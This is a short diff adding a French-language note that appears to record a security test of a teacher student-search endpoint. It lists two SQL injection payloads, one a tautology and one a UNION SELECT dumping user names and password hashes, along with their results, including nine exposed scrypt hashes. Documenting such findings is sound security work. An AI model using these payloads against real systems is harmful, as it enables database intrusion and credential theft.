@@ -1,0 +1,4 @@
+# V2 injection SQL — recherche enseignant /teacher/students?q=
+q = "' OR '1'='1"  -> HTTP 200, lignes renvoyées : 6
+q = "%' UNION SELECT id, name, password_hash FROM users --"  -> HTTP 200, lignes renvoyées : 15
+Hachages de mots de passe visibles : 9 (préfixes : ['scrypt:32768:8:1'])
